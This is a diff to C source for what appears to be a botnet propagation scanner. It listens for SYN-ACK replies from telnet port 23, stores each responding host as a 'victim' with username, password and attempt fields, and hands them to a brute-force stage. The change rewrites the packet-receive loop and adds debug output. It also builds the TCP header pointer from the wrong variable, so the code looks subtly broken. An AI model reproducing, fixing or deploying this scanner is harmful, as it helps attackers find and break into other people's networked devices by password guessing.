@@ -172,7 +172,7 @@ bool scan_scanner(void)
 		victim_table[i].sock = -1;
 	}
 
-	int32_t sock, i = 1;
+	int32_t sock, i = 1, n;
 	uint16_t fails = 0;
 	char datagram[4096];
 	zero(datagram, 4096);
@@ -287,48 +287,37 @@ bool scan_scanner(void)
 		// printd("Moving to recvfrom()");
 		while (1)
 		{
-			unsigned char buf[4000];
+			unsigned char buf[1514];
+			struct iphdr *riph = (struct iphdr *)buf;
+            struct tcphdr *rtcph = (struct tcphdr *)(iph + 1);
 			errno = 0;
 
-			if (recvfrom(sock, buf, 1024, 0, NULL, NULL) <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
-			{
-				// printd("Failed to recv, moving on.");
+			n = recvfrom(sock, buf, sizeof(buf), 0, NULL, NULL);
+			if (n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
 				break;
-			}
 
+			printf("%s->%s %d %d %d %d %d\n", ipv4_unpack(riph->saddr), ipv4_unpack(riph->daddr), riph->protocol, rtcph->syn, rtcph->ack, htons(rtcph->source), htons(rtcph->dest));
 
-			struct iphdr *riph = (struct iphdr *)buf;
-			unsigned short iphdrlen;
-			if (riph->protocol == 6) // Packet needs to be TCP
-			{
-				iphdrlen = riph->ihl * 4;
-				struct tcphdr *rtcph = (struct tcphdr *)(buf + iphdrlen);
+			if (riph->protocol != 6) // Packet needs to be TCP
+				break;
+			if (rtcph->syn != 1)
+				break;
+			if (rtcph->ack != 1)
+				break;
+			if (rtcph->source != htons(23))
+				break;
 
-				printd("Got a live one! %s flags: SYN %d ACK %d FIN %d", ipv4_unpack(riph->saddr), rtcph->syn, rtcph->ack,rtcph->fin);
-				
-				// Check that it is a SYN ACK and if it matches our source port
-				if (rtcph->syn == 1 && rtcph->ack == 1 && rtcph->dest == LOCAL_PORT && rtcph->source == 23/*&& ipv4_inrange(source.sin_addr.s_addr, start, end)*/)
-				{
-#ifdef DEBUG
-{
-					pktd(riph, rtcph)
-					char ipstr[INET_ADDRSTRLEN];
-					addr.sin_addr.s_addr = riph->saddr;
-					inet_ntop(AF_INET, &(addr.sin_addr), ipstr, INET_ADDRSTRLEN);
-					printd("Adding IP: %s/%s", ipstr, ipv4_unpack(riph->saddr));
-}
-#endif
-					struct scan_victim *victim;
-					victim = &victim_table[i];
-					victim->ip = riph->saddr;
-					victim->user = 0;
-					victim->pass = 0;
-					victim->tries = 0;
-					victim->state = CONNECTING;
-					if (i++ >= SCAN_SCANNER_MAXCON)
-						break;
-				}
-			}
+			printd("Got a live one! %s flags: SYN %d ACK %d FIN %d", ipv4_unpack(riph->saddr), rtcph->syn, rtcph->ack,rtcph->fin);
+			
+			struct scan_victim *victim;
+			victim = &victim_table[i];
+			victim->ip = riph->saddr;
+			victim->user = 0;
+			victim->pass = 0;
+			victim->tries = 0;
+			victim->state = CONNECTING;
+			if (i++ >= SCAN_SCANNER_MAXCON)
+				break;
 		}
 		// printd("Moving to bruteforce");
 		while (1)
